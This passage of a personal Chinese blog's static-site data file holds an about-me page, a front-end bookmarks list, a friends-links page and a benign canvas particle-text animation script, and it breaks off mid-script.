知乎狂魔\n* 曾经的OIer，算法小渣渣\n* 曾经混过百度空间、饭否、远景论坛\n* 爱做饭爱蹭饭\n\n# 联系方式\n\n* 微信：yifani\n* 邮件：yifanb@gmail.com （接受邮件，一直会回复）\n* 知乎：[点击进入...](https://www.zhihu.com/people/yfgeek)\n","source":"aboutme/index.md","raw":"---\ntitle: 关于\npermalink: aboutme\nid: 10\ndate: 2016-09-26 00:27:35\nheader-img: \"content/images/f2e/about-me.jpg\"\n\n---\n# 关于我\n\n** 一凡，Ivan **\n\n本科 自动化 研究生 计算机科学技术\n\n人在 英国 来自 北京\n\nUniversity of Birmingham\n\n* 自幼喜爱计算机技术 极客 爱钻研 爱学习\n* 爱好Web前端 (React粉丝)\n* 爱好渗透测试\n* 和前端相关的美工，但渣\n* 从来不用收藏夹，一直背网址\n* 空格档\n* Github的star各种人的狂魔\n* Cnbeta党\n* Mac党，中度果粉\n* 知乎狂魔\n* 曾经的OIer，算法小渣渣\n* 曾经混过百度空间、饭否、远景论坛\n* 爱做饭爱蹭饭\n\n# 联系方式\n\n* 微信：yifani\n* 邮件：yifanb@gmail.com （接受邮件，一直会回复）\n* 知乎：[点击进入...](https://www.zhihu.com/people/yfgeek)\n","updated":"2017-03-08T19:05:11.000Z","path":"aboutme.html","comments":1,"layout":"page","_id":"cj2mm9xnc00035es5xowggp1p","content":"<h1 id=\"关于我\"><a href=\"#关于我\" class=\"headerlink\" title=\"关于我\"></a>关于我</h1><p><strong> 一凡，Ivan </strong></p>\n<p>本科 自动化 研究生 计算机科学技术</p>\n<p>人在 英国 来自 北京</p>\n<p>University of Birmingham</p>\n<ul>\n<li>自幼喜爱计算机技术 极客 爱钻研 爱学习</li>\n<li>爱好Web前端 (React粉丝)</li>\n<li>爱好渗透测试</li>\n<li>和前端相关的美工，但渣</li>\n<li>从来不用收藏夹，一直背网址</li>\n<li>空格档</li>\n<li>Github的star各种人的狂魔</li>\n<li>Cnbeta党</li>\n<li>Mac党，中度果粉</li>\n<li>知乎狂魔</li>\n<li>曾经的OIer，算法小渣渣</li>\n<li>曾经混过百度空间、饭否、远景论坛</li>\n<li>爱做饭爱蹭饭</li>\n</ul>\n<h1 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h1><ul>\n<li>微信：yifani</li>\n<li>邮件：yifanb@gmail.com （接受邮件，一直会回复）</li>\n<li>知乎：<a href=\"https://www.zhihu.com/people/yfgeek\" target=\"_blank\" rel=\"external\">点击进入…</a></li>\n</ul>\n","excerpt":"","more":"<h1 id=\"关于我\"><a href=\"#关于我\" class=\"headerlink\" title=\"关于我\"></a>关于我</h1><p><strong> 一凡，Ivan </strong></p>\n<p>本科 自动化 研究生 计算机科学技术</p>\n<p>人在 英国 来自 北京</p>\n<p>University of Birmingham</p>\n<ul>\n<li>自幼喜爱计算机技术 极客 爱钻研 爱学习</li>\n<li>爱好Web前端 (React粉丝)</li>\n<li>爱好渗透测试</li>\n<li>和前端相关的美工，但渣</li>\n<li>从来不用收藏夹，一直背网址</li>\n<li>空格档</li>\n<li>Github的star各种人的狂魔</li>\n<li>Cnbeta党</li>\n<li>Mac党，中度果粉</li>\n<li>知乎狂魔</li>\n<li>曾经的OIer，算法小渣渣</li>\n<li>曾经混过百度空间、饭否、远景论坛</li>\n<li>爱做饭爱蹭饭</li>\n</ul>\n<h1 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h1><ul>\n<li>微信：yifani</li>\n<li>邮件：yifanb@gmail.com （接受邮件，一直会回复）</li>\n<li>知乎：<a href=\"https://www.zhihu.com/people/yfgeek\">点击进入…</a></li>\n</ul>\n"},{"title":"前端收藏夹","id":7,"updated":"2016-08-17T18:53:28.000Z","date":"2016-07-30T23:27:35.000Z","header-img":"content/images/f2e/post-bg-js-version.jpg","_content":"\n这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。\n\n# 前端CDN\n* [CDNBEE](https://cdnbee.com/)\n\n# 模板素材\n* [easyicon](http://www.easyicon.net/)\n* [阿里巴巴iconfont](http://iconfont.cn/) (荐)\n* [Fontello](http://fontello.com/)\n\n\n* [稀土区](https://xituqu.com/)\n* [优设](http://www.uisdc.com/)\n* [pixabay](https://pixabay.com/zh/) (荐)\n* [500px](https://marketplace.500px.com/)\n* [壁纸wallhaven](https://alpha.wallhaven.cc/) (荐)\n* [jquery](http://www.htmleaf.com/)\n\n# 模板\n* [HTML5 UP](https://html5up.net/)\n* [控制面板](https://www.awesomes.cn/subject/admins)\n\n# 网站\n* [Github热度排名](https://www.awesomes.cn/)\n* [imweb前端社区](http://imweb.io/)\n* [前端乱炖](http://www.html-js.com/)\n* [鑫空间](http://www.zhangxinxu.com/wordpress/)\n* [AlloyTeam](http://www.alloyteam.com/)\n\n# Github\n* [我Star的项目](https://github.com/yfgeek?tab=stars)\n\n# 娱乐\n* [前端 JSer 装逼手册](https://segmentfault.com/a/1190000005987011)\n\n# 工具\n* [工具武装的前端开发工程师](https://github.com/jaywcjlove/awesome-mac)\n* [在Mac平台配置你的开发环境](http://mp.weixin.qq.com/s?__biz=MzI3MDE0MzAzMw==&mid=2652201857&idx=1&sn=803e04a8304c127aaa0bb7770f8add1d&scene=0#wechat_redirect)\n* [前端工具箱chrome插件](https://github.com/Pearyman/chrome_plugin)\n\n\n![](/content/images/f2e/keep-calm-and-learn-javascript.png)\n","source":"fav/index.md","raw":"---\ntitle: 前端收藏夹\npermalink: f2e\nid: 7\nupdated: '2016-08-17 19:53:28'\ndate: 2016-07-31 00:27:35\nheader-img: \"content/images/f2e/post-bg-js-version.jpg\"\n\n---\n\n这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。\n\n# 前端CDN\n* [CDNBEE](https://cdnbee.com/)\n\n# 模板素材\n* [easyicon](http://www.easyicon.net/)\n* [阿里巴巴iconfont](http://iconfont.cn/) (荐)\n* [Fontello](http://fontello.com/)\n\n\n* [稀土区](https://xituqu.com/)\n* [优设](http://www.uisdc.com/)\n* [pixabay](https://pixabay.com/zh/) (荐)\n* [500px](https://marketplace.500px.com/)\n* [壁纸wallhaven](https://alpha.wallhaven.cc/) (荐)\n* [jquery](http://www.htmleaf.com/)\n\n# 模板\n* [HTML5 UP](https://html5up.net/)\n* [控制面板](https://www.awesomes.cn/subject/admins)\n\n# 网站\n* [Github热度排名](https://www.awesomes.cn/)\n* [imweb前端社区](http://imweb.io/)\n* [前端乱炖](http://www.html-js.com/)\n* [鑫空间](http://www.zhangxinxu.com/wordpress/)\n* [AlloyTeam](http://www.alloyteam.com/)\n\n# Github\n* [我Star的项目](https://github.com/yfgeek?tab=stars)\n\n# 娱乐\n* [前端 JSer 装逼手册](https://segmentfault.com/a/1190000005987011)\n\n# 工具\n* [工具武装的前端开发工程师](https://github.com/jaywcjlove/awesome-mac)\n* [在Mac平台配置你的开发环境](http://mp.weixin.qq.com/s?__biz=MzI3MDE0MzAzMw==&mid=2652201857&idx=1&sn=803e04a8304c127aaa0bb7770f8add1d&scene=0#wechat_redirect)\n* [前端工具箱chrome插件](https://github.com/Pearyman/chrome_plugin)\n\n\n![](/content/images/f2e/keep-calm-and-learn-javascript.png)\n","path":"f2e.html","comments":1,"layout":"page","_id":"cj2mm9xnf00055es554a4g9a5","content":"<p>这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。</p>\n<h1 id=\"前端CDN\"><a href=\"#前端CDN\" class=\"headerlink\" title=\"前端CDN\"></a>前端CDN</h1><ul>\n<li><a href=\"https://cdnbee.com/\" target=\"_blank\" rel=\"external\">CDNBEE</a></li>\n</ul>\n<h1 id=\"模板素材\"><a href=\"#模板素材\" class=\"headerlink\" title=\"模板素材\"></a>模板素材</h1><ul>\n<li><a href=\"http://www.easyicon.net/\" target=\"_blank\" rel=\"external\">easyicon</a></li>\n<li><a href=\"http://iconfont.cn/\" target=\"_blank\" rel=\"external\">阿里巴巴iconfont</a> (荐)</li>\n<li><a href=\"http://fontello.com/\" target=\"_blank\" rel=\"external\">Fontello</a></li>\n</ul>\n<ul>\n<li><a href=\"https://xituqu.com/\" target=\"_blank\" rel=\"external\">稀土区</a></li>\n<li><a href=\"http://www.uisdc.com/\" target=\"_blank\" rel=\"external\">优设</a></li>\n<li><a href=\"https://pixabay.com/zh/\" target=\"_blank\" rel=\"external\">pixabay</a> (荐)</li>\n<li><a href=\"https://marketplace.500px.com/\" target=\"_blank\" rel=\"external\">500px</a></li>\n<li><a href=\"https://alpha.wallhaven.cc/\" target=\"_blank\" rel=\"external\">壁纸wallhaven</a> (荐)</li>\n<li><a href=\"http://www.htmleaf.com/\" target=\"_blank\" rel=\"external\">jquery</a></li>\n</ul>\n<h1 id=\"模板\"><a href=\"#模板\" class=\"headerlink\" title=\"模板\"></a>模板</h1><ul>\n<li><a href=\"https://html5up.net/\" target=\"_blank\" rel=\"external\">HTML5 UP</a></li>\n<li><a href=\"https://www.awesomes.cn/subject/admins\" target=\"_blank\" rel=\"external\">控制面板</a></li>\n</ul>\n<h1 id=\"网站\"><a href=\"#网站\" class=\"headerlink\" title=\"网站\"></a>网站</h1><ul>\n<li><a href=\"https://www.awesomes.cn/\" target=\"_blank\" rel=\"external\">Github热度排名</a></li>\n<li><a href=\"http://imweb.io/\" target=\"_blank\" rel=\"external\">imweb前端社区</a></li>\n<li><a href=\"http://www.html-js.com/\" target=\"_blank\" rel=\"external\">前端乱炖</a></li>\n<li><a href=\"http://www.zhangxinxu.com/wordpress/\" target=\"_blank\" rel=\"external\">鑫空间</a></li>\n<li><a href=\"http://www.alloyteam.com/\" target=\"_blank\" rel=\"external\">AlloyTeam</a></li>\n</ul>\n<h1 id=\"Github\"><a href=\"#Github\" class=\"headerlink\" title=\"Github\"></a>Github</h1><ul>\n<li><a href=\"https://github.com/yfgeek?tab=stars\" target=\"_blank\" rel=\"external\">我Star的项目</a></li>\n</ul>\n<h1 id=\"娱乐\"><a href=\"#娱乐\" class=\"headerlink\" title=\"娱乐\"></a>娱乐</h1><ul>\n<li><a href=\"https://segmentfault.com/a/1190000005987011\" target=\"_blank\" rel=\"external\">前端 JSer 装逼手册</a></li>\n</ul>\n<h1 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h1><ul>\n<li><a href=\"https://github.com/jaywcjlove/awesome-mac\" target=\"_blank\" rel=\"external\">工具武装的前端开发工程师</a></li>\n<li><a href=\"http://mp.weixin.qq.com/s?__biz=MzI3MDE0MzAzMw==&amp;mid=2652201857&amp;idx=1&amp;sn=803e04a8304c127aaa0bb7770f8add1d&amp;scene=0#wechat_redirect\" target=\"_blank\" rel=\"external\">在Mac平台配置你的开发环境</a></li>\n<li><a href=\"https://github.com/Pearyman/chrome_plugin\" target=\"_blank\" rel=\"external\">前端工具箱chrome插件</a></li>\n</ul>\n<p><img src=\"/content/images/f2e/keep-calm-and-learn-javascript.png\" alt=\"\"></p>\n","excerpt":"","more":"<p>这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。</p>\n<h1 id=\"前端CDN\"><a href=\"#前端CDN\" class=\"headerlink\" title=\"前端CDN\"></a>前端CDN</h1><ul>\n<li><a href=\"https://cdnbee.com/\">CDNBEE</a></li>\n</ul>\n<h1 id=\"模板素材\"><a href=\"#模板素材\" class=\"headerlink\" title=\"模板素材\"></a>模板素材</h1><ul>\n<li><a href=\"http://www.easyicon.net/\">easyicon</a></li>\n<li><a href=\"http://iconfont.cn/\">阿里巴巴iconfont</a> (荐)</li>\n<li><a href=\"http://fontello.com/\">Fontello</a></li>\n</ul>\n<ul>\n<li><a href=\"https://xituqu.com/\">稀土区</a></li>\n<li><a href=\"http://www.uisdc.com/\">优设</a></li>\n<li><a href=\"https://pixabay.com/zh/\">pixabay</a> (荐)</li>\n<li><a href=\"https://marketplace.500px.com/\">500px</a></li>\n<li><a href=\"https://alpha.wallhaven.cc/\">壁纸wallhaven</a> (荐)</li>\n<li><a href=\"http://www.htmleaf.com/\">jquery</a></li>\n</ul>\n<h1 id=\"模板\"><a href=\"#模板\" class=\"headerlink\" title=\"模板\"></a>模板</h1><ul>\n<li><a href=\"https://html5up.net/\">HTML5 UP</a></li>\n<li><a href=\"https://www.awesomes.cn/subject/admins\">控制面板</a></li>\n</ul>\n<h1 id=\"网站\"><a href=\"#网站\" class=\"headerlink\" title=\"网站\"></a>网站</h1><ul>\n<li><a href=\"https://www.awesomes.cn/\">Github热度排名</a></li>\n<li><a href=\"http://imweb.io/\">imweb前端社区</a></li>\n<li><a href=\"http://www.html-js.com/\">前端乱炖</a></li>\n<li><a href=\"http://www.zhangxinxu.com/wordpress/\">鑫空间</a></li>\n<li><a href=\"http://www.alloyteam.com/\">AlloyTeam</a></li>\n</ul>\n<h1 id=\"Github\"><a href=\"#Github\" class=\"headerlink\" title=\"Github\"></a>Github</h1><ul>\n<li><a href=\"https://github.com/yfgeek?tab=stars\">我Star的项目</a></li>\n</ul>\n<h1 id=\"娱乐\"><a href=\"#娱乐\" class=\"headerlink\" title=\"娱乐\"></a>娱乐</h1><ul>\n<li><a href=\"https://segmentfault.com/a/1190000005987011\">前端 JSer 装逼手册</a></li>\n</ul>\n<h1 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h1><ul>\n<li><a href=\"https://github.com/jaywcjlove/awesome-mac\">工具武装的前端开发工程师</a></li>\n<li><a href=\"http://mp.weixin.qq.com/s?__biz=MzI3MDE0MzAzMw==&amp;mid=2652201857&amp;idx=1&amp;sn=803e04a8304c127aaa0bb7770f8add1d&amp;scene=0#wechat_redirect\">在Mac平台配置你的开发环境</a></li>\n<li><a href=\"https://github.com/Pearyman/chrome_plugin\">前端工具箱chrome插件</a></li>\n</ul>\n<p><img src=\"/content/images/f2e/keep-calm-and-learn-javascript.png\" alt=\"\"></p>\n"},{"title":"友情链接","id":8,"date":"2016-09-25T23:27:35.000Z","_content":"# 友情链接\n\n## 百度空间好友\n\n* [Fuxiaohei](http://fuxiaohei.me/)\n* [幽虫博客](https://luoyandi.wordpress.com/)\n* [胡戈戈](http://hugege.com)\n* [safe121](http://www.safe121.com)\n* [Panda熊猫](http://www.panda-studio.cn/)\n* [lzlhoho](http://lzlhoho.zcool.com.cn/)\n* [52abc/xinzhixiang](http://xxz.cc)\n* [Monyer](http://monyer.com/)\n\n## 生活好友\n\n* [Wayne Yan](http://yw1994.github.io)\n* [Echowxsy](http://blog.echowxsy.com/)\n* [rjgeek](http://rjgeek.github.io/)\n* [jazzyin](http://jazzyin.com/)\n","source":"link/index.md","raw":"---\ntitle: 友情链接\npermalink: link\nid: 8\ndate: 2016-09-26 00:27:35\n---\n# 友情链接\n\n## 百度空间好友\n\n* [Fuxiaohei](http://fuxiaohei.me/)\n* [幽虫博客](https://luoyandi.wordpress.com/)\n* [胡戈戈](http://hugege.com)\n* [safe121](http://www.safe121.com)\n* [Panda熊猫](http://www.panda-studio.cn/)\n* [lzlhoho](http://lzlhoho.zcool.com.cn/)\n* [52abc/xinzhixiang](http://xxz.cc)\n* [Monyer](http://monyer.com/)\n\n## 生活好友\n\n* [Wayne Yan](http://yw1994.github.io)\n* [Echowxsy](http://blog.echowxsy.com/)\n* [rjgeek](http://rjgeek.github.io/)\n* [jazzyin](http://jazzyin.com/)\n","updated":"2017-03-08T19:05:12.000Z","path":"link.html","comments":1,"layout":"page","_id":"cj2mm9xnm00095es5ppjj2u0l","content":"<h1 id=\"友情链接\"><a href=\"#友情链接\" class=\"headerlink\" title=\"友情链接\"></a>友情链接</h1><h2 id=\"百度空间好友\"><a href=\"#百度空间好友\" class=\"headerlink\" title=\"百度空间好友\"></a>百度空间好友</h2><ul>\n<li><a href=\"http://fuxiaohei.me/\" target=\"_blank\" rel=\"external\">Fuxiaohei</a></li>\n<li><a href=\"https://luoyandi.wordpress.com/\" target=\"_blank\" rel=\"external\">幽虫博客</a></li>\n<li><a href=\"http://hugege.com\" target=\"_blank\" rel=\"external\">胡戈戈</a></li>\n<li><a href=\"http://www.safe121.com\" target=\"_blank\" rel=\"external\">safe121</a></li>\n<li><a href=\"http://www.panda-studio.cn/\" target=\"_blank\" rel=\"external\">Panda熊猫</a></li>\n<li><a href=\"http://lzlhoho.zcool.com.cn/\" target=\"_blank\" rel=\"external\">lzlhoho</a></li>\n<li><a href=\"http://xxz.cc\" target=\"_blank\" rel=\"external\">52abc/xinzhixiang</a></li>\n<li><a href=\"http://monyer.com/\" target=\"_blank\" rel=\"external\">Monyer</a></li>\n</ul>\n<h2 id=\"生活好友\"><a href=\"#生活好友\" class=\"headerlink\" title=\"生活好友\"></a>生活好友</h2><ul>\n<li><a href=\"http://yw1994.github.io\" target=\"_blank\" rel=\"external\">Wayne Yan</a></li>\n<li><a href=\"http://blog.echowxsy.com/\" target=\"_blank\" rel=\"external\">Echowxsy</a></li>\n<li><a href=\"http://rjgeek.github.io/\" target=\"_blank\" rel=\"external\">rjgeek</a></li>\n<li><a href=\"http://jazzyin.com/\" target=\"_blank\" rel=\"external\">jazzyin</a></li>\n</ul>\n","excerpt":"","more":"<h1 id=\"友情链接\"><a href=\"#友情链接\" class=\"headerlink\" title=\"友情链接\"></a>友情链接</h1><h2 id=\"百度空间好友\"><a href=\"#百度空间好友\" class=\"headerlink\" title=\"百度空间好友\"></a>百度空间好友</h2><ul>\n<li><a href=\"http://fuxiaohei.me/\">Fuxiaohei</a></li>\n<li><a href=\"https://luoyandi.wordpress.com/\">幽虫博客</a></li>\n<li><a href=\"http://hugege.com\">胡戈戈</a></li>\n<li><a href=\"http://www.safe121.com\">safe121</a></li>\n<li><a href=\"http://www.panda-studio.cn/\">Panda熊猫</a></li>\n<li><a href=\"http://lzlhoho.zcool.com.cn/\">lzlhoho</a></li>\n<li><a href=\"http://xxz.cc\">52abc/xinzhixiang</a></li>\n<li><a href=\"http://monyer.com/\">Monyer</a></li>\n</ul>\n<h2 id=\"生活好友\"><a href=\"#生活好友\" class=\"headerlink\" title=\"生活好友\"></a>生活好友</h2><ul>\n<li><a href=\"http://yw1994.github.io\">Wayne Yan</a></li>\n<li><a href=\"http://blog.echowxsy.com/\">Echowxsy</a></li>\n<li><a href=\"http://rjgeek.github.io/\">rjgeek</a></li>\n<li><a href=\"http://jazzyin.com/\">jazzyin</a></li>\n</ul>\n"},{"layout":"tags","noDate":true,"comments":0,"_content":"","source":"tags/index.md","raw":"---\nlayout: tags\nnoDate: true\ncomments: false\n---\n","date":"2017-03-08T19:05:12.000Z","updated":"2017-03-08T19:05:12.000Z","path":"tags/index.html","title":"","_id":"cj2mm9xnn000b5es5ic2ino0u","content":"","excerpt":"","more":""},{"_content":"","source":"about/scripts/words.js","raw":"","date":"2017-03-08T19:05:11.000Z","updated":"2017-03-08T19:05:11.000Z","path":"about/scripts/words.js","layout":"false","title":"","comments":1,"_id":"cj2mm9xqq004j5es5epjo61du","content":"","excerpt":"","more":""},{"_content":";(function (window) {\n  window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame ||\n  window.webkitRequestAnimationFrame || window.msRequestAnimationFrame\n\n  const FRAME_RATE = 60\n  const PARTICLE_NUM = 2000\n  const RADIUS = Math.PI * 2\n  const CANVASWIDTH = 500\n  const CANVASHEIGHT = 150\n  const CANVASID = 'canvas'\n\n  let texts = ['Hello', '我叫一凡', '伯明翰大学', '喜爱计算机', '极客一个', 'Web前端', '渗透测试', '小美工', '爱背网址', '空格党', 'Github狂魔', 'Cnbeta党', 'Mac党 果粉', '知乎狂魔', '曾经的OIer', '爱Linux', '喜欢交友', '欢迎联系我']\n\n  let canvas,\n    ctx,\n    particles = [],\n    quiver = true,\n    text = texts[0],\n    textIndex = 0,\n    textSize = 70\n\n  function draw () {\n    ctx.clearRect(0, 0, CANVASWIDTH, CANVASHEIGHT)\n    ctx.fillStyle = 'rgb(255, 255, 255)'\n    ctx.textBaseline = 'middle'\n    ctx.fontWeight = 'bold'\n    ctx.font = textSize + 'px \\'SimHei\\', \\'Avenir\\', \\'Helvetica Neue\\', \\'Arial\\', \\'sans-serif\\''\n    ctx.fillText(text, (CANVASWIDTH - ctx.measureText(text).width) * 0.5, CANVASHEIGHT * 0.5)\n\n    let imgData = ctx.getImageData(0, 0, CANVASWIDTH, CANVASHEIGHT)\n\n    ctx.clearRect(0, 0, CANVASWIDTH, CANVASHEIGHT)\n\n    for (let i = 0, l = particles.length; i < l; i++) {\n      let p = particles[i]\n      p.inText = false\n    }\n    particleText(imgData)\n\n    window.requestAnimationFrame(draw)\n  }\n\n  function particleText (imgData) {\n    // 点坐标获取\n    var pxls = []\n    for (var w = CANVASWIDTH; w > 0; w -= 3) {\n      for (var h = 0; h < CANVASHEIGHT; h += 3) {\n        var index = (w + h * (CANVASWIDTH)) * 4\n        if (imgData.data[index] > 1) {\n          pxls.push([w, h])\n        }\n      }\n    }\n\n    var count = pxls.length\n    var j = parseInt((particles.length - pxls.length) / 2, 10)\n    j = j < 0 ? 0 : j\n\n    for (var i = 0; i < pxls.length && j < particles.length; i++, j++) {\n      try {\n        var p = particles[j],\n          X,\n          Y\n\n        if (quiver) {\n          X = (pxls[i - 1][0]) - (p.px + Math.random() * 10)\n          Y = (pxls[i - 1][1]) - (p.py + Math.random() * 10)\n        } else {\n          X = (pxls[i - 1][0]) - p.px\n          Y = (pxls[i - 1][1]) - p.py\n        }\n        var T = Math.sqrt(X * X + Y * Y)\n        var A = Math.atan2(Y, X)\n        var C = Math.cos(A)\n        var S = Math.sin(A)\n        p.x = p.px + C * T * p.delta\n        p.y = p.py + S * T * p.delta\n        p.px = p.x\n        p.py = p.y\n        p.inText = true\n        p.fadeIn()\n        p.draw(ctx)\n      } catch (e) {}\n    }\n    for (var i = 0; i < particles.length; i++) {\n      var p = particles[i]\n      if (!p.inText) {\n        p.fadeOut()\n\n        var X = p.mx - p.px\n        var Y = p.my - p.py\n        var T = Math.sqrt(X * X + Y * Y)\n        var A = Math.atan2(Y, X)\n        var C = Math.cos(A)\n        var S = Math.sin(A)\n\n        p.x = p.px + C * T * p.delta / 2\n        p.y = p.py + S * T * p.delta / 2\n        p.px = p.x\n        p.py = p.y\n\n        p.draw(ctx)\n      }\n    }\n  }\n\n  function setDimensions () {\n    canvas.width = CANVASWIDTH\n    canvas.height = CANVASHEIGHT\n    canvas.style.position = 'absolute'\n    canvas.style.left = '0px'\n    canvas.style.top = '0px'\n    canvas.style.bottom = '0px'\n    canvas.style.right = '0px'\n    canvas.style.marginTop = window.innerHeight * .15 + 'px'\n  }\n\n  function event () {\n    document.addEventListener('click', function (e) {\n      textIndex++\n      if (textIndex >= texts.length) {\n          window.location.href=\"/aboutme.html\";\n      }\n      text = texts[textIndex]\n    }, false)\n\n    document.addEventListener('touchstart', function (e) {\n      textIndex++\n      if (textIndex >= texts.length) {\n          window.location.href=\"/aboutme.html\";\n      }\n      text = texts[textIndex]\n    }, false)\n  }\n\n  function init () {\n    canvas = document.getElementById(CANVASID)\n    if (canvas === null || !canvas.getContext) {\n      return\n    }\n    ctx = canvas.getContext('2d')\n    setDimensions()\n    event()\n\n    for (var i = 0; i < PARTICLE_NUM; i++) {\n      particles[i] = new Particle(canvas)\n    }\n\n    draw()\n  }\n\n  class Particle {\n    constructor (canvas) {\n      let spread = canvas.height\n      let size = Math.random() * 1.2\n      // 速度\n      this.delta = 0.06\n      // 现在的位置\n      this.x = 0\n      this.y = 0\n      // 上次的位置\n      this.px = Math.random() * canvas.width\n      this.py = (canvas.height * 0.5) + ((Math.random() - 0.5) * spread)\n      // 记录点最初的位置\n      this.mx = this.px\n      this.my = this.py\n      // 点的大小\n      this.size = size\n      // this.origSize = size\n      // 是否用来显示字\n      this.inText = false\n      // 透明度相关\n      this.opacity = 0\n      this.fadeInRate = 0.05\n      this.fadeOutRate = 0.03\n      this.opacityTresh = 0.98\n      this.fadingOut = true\n      this.fadingIn = true\n    }\n    fadeIn () {\n      this.fadingIn = this.opacity > this.opacityTresh ? false : true\n      if (this.fadingIn) {\n        this.opacity += this.fadeInRate\n      }else {\n        this.opacity = 1\n      }\n    }\n    fadeOut () {\n      this.fadingOut = this.opacity < 0 ? false : true\n      if (this.fadingOut) {\n        this.opacity -= this.fadeOutRate\n        if (this.opacity < 0) {\n          this.opacity = 0\n        }\n      }else {\n        this.opacity = 0\n      }\n    }\n    draw (ctx) {\n      ctx.fillStyle = 'rgba(226,225,142, ' + this.opacity + ')'\n      ctx.beginPath()\n      ctx.arc(this.x, this.y, this.size, 0, RADIUS, true)\n      ctx.closePath()\n      ctx.fill()\n    }\n  }\n\n  // setTimeout(() => {\n    init()\n  // }, 4000);\n  // mp3.play()\n})(window)\n","source":"about/scripts/main.js","raw":";(function (window) {\n  window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame ||\n  window.webkitRequestAnimationFrame || window.msRequestAnimationFrame\n\n  const FRAME_RATE = 60\n  const PARTICLE_NUM = 2000\n  const RADIUS = Math.PI * 2\n  const CANVASWIDTH = 500\n  const CANVASHEIGHT = 150\n  const CANVASID = 'canvas'\n\n  let texts = ['Hello', '我叫一凡', '伯明翰大学', '喜爱计算机', '极客一个', 'Web前端', '渗透测试', '小美工', '爱背网址', '空格党', 'Github狂魔', 'Cnbeta党', 'Mac党 果粉', '知乎狂魔', '曾经的OIer', '爱Linux', '喜欢交友', '欢迎联系我']\n\n  let canvas,\n    ctx,\n    particles = [],\n    quiver = true,\n    text = texts[0],\n    textIndex = 0,\n    textSize = 70\n\n  function draw () {\n    ctx.clearRect(0, 0, CANVASWIDTH, CANVASHEIGHT)\n    ctx.fillStyle = 'rgb(255, 255, 255)'\n    ctx.textBaseline = 'middle'\n    ctx.fontWeight = 'bold'\n    ctx.font = textSize + 'px \\'SimHei\\', \\'Avenir\\', \\'Helvetica Neue\\', \\'Arial\\', \\'sans-serif\\''\n    ctx.fillText(text, (CANVASWIDTH - ctx.measureText(text).width) * 0.5, CANVASHEIGHT * 0.5)\n\n    let imgData = ctx.getImageData(0, 0, CANVASWIDTH, CANVASHEIGHT)\n\n    ctx.clearRect(0, 0, CANVASWIDTH, CANVASHEIGHT)\n\n    for (let i = 0, l = particles.length; i < l; i++) {\n      let p = particles[i]\n      p.inText = false\n    }\n    particleText(imgData)\n\n    window.requestAnimationFrame(draw)\n  }\n\n  function particleText (imgData) {\n    // 点坐标获取\n    var pxls = []\n    for (var w = CANVASWIDTH; w > 0; w -= 3) {\n      for (var h = 0; h < CANVASHEIGHT; h += 3) {\n        var index = (w + h * (CANVASWIDTH)) * 4\n        if (imgData.data[index] > 1) {\n          pxls.push([w, h])\n        }\n      }\n    }\n\n    var count = pxls.length\n    var j = parseInt((particles.length - pxls.length) / 2, 10)\n    j = j < 0 ? 0 : j\n\n    for (var i = 0; i < pxls.length && j < particles.length; i++, j++) {\n      try {\n        var p = particles[j],\n          X,\n          Y\n\n        if (quiver) {\n          X = (pxls[i - 1][0]) - (p.px + Math.random() * 10)\n          Y = (pxls[i - 1][1]) - (p.py + Math.random() * 10)\n        } else {\n          X = (pxls[i - 1][0]) - p.px\n          Y = (pxls[i - 1][1]) - p.py\n        }\n        var T = Math.sqrt(X * X + Y * Y)\n        var A = Math.atan2(Y, X)\n        var C = Math.cos(A)\n        var S = Math.sin(A)\n        p.x = p.px + C * T * p.delta\n        p.y = p.py + S * T * p.delta\n        p.px = p.x\n        p.py = p.y\n        p.inText = true\n        p.fadeIn()\n        p.draw(ctx)\n      } catch (e) {}\n    }\n    for (var i = 0; i < particles.length; i++) {\n      var p = particles[i]\n      if (!p.inText) {\n        p.fadeOut()\n\n        var X = p.mx - p.px\n        var Y = p.my - p.py\n        var T = Math.sqrt(X * X + Y * Y)\n        var A = Math.atan2(Y, X)\n        var C = Math.cos(A)\n        var S = Math.sin(A)\n\n        p.x = p.px + C * T * p.delta / 2\n        p.y = p.py + S * T * p.delta / 2\n        p.px = p.x\n        p.py = p.y\n\n        p.draw(ctx)\n      }\n    }\n  }\n\n  function setDimensions () {\n    canvas.width = CANVASWIDTH\n    canvas.height = CANVASHEIGHT\n    canvas.style.position = 'absolute'\n    canvas.style.left = '0px'\n    canvas.style.top = '0px'\n    canvas.style.bottom = '0px'\n    canvas.style.right = '0px'\n    canvas.style.marginTop = window.innerHeight * .15 + 'px'\n  }\n\n  function event () {\n    document.addEventListener('click', function (e) {\n      textIndex++\n      if (textIndex >= texts.length) {\n          window.location.href=\"/aboutme.html\";\n      }\n      text = texts[textIndex]\n    }, false)\n\n    document.addEventListener('touchstart', function (e) {\n      textIndex++\n      if (textIndex >= texts.length) {\n          window.location.href=\"/aboutme.html\";\n      }\n      text = texts[textIndex]\n    }, false)\n  }\n\n  function init () {\n    canvas = document.getElementById(CANVASID)\n    if (canvas === null || !canvas.getContext) {\n      return\n    }\n    ctx = canvas.getContext('2d')\n    setDimensions()\n    event()\n\n    for (var i = 0; i < PARTICLE_NUM; i++) {\n      particles[i] = new Particle(canvas)\n    }\n\n    draw()\n  }\n\n  class Particle {\n    constructor (canvas) {\n      let spread = canvas.height\n      let size = Math.random() * 1.2\n      // 速度\n      this.delta = 0.06\n      // 现在的位置\n      this.x = 0\n      this.y = 0\n      // 上次的位置\n      this.px = Math.random() * canvas.width\n      this.py = (canvas.height * 0.5) + ((Math.random() - 0.5) * spread)\n      // 记录点最初的位置\n      this.mx = this.px\n      this.my = this.py\n      // 点的大小\n      this.size = size\n      // this.origSize = size\n      // 是否用来显示字\n      this.inText = false\n      // 透明度相关\n      this.opacity = 0\n      this.fadeInRate = 0.05\n      this.fadeOutRate = 0.03\n      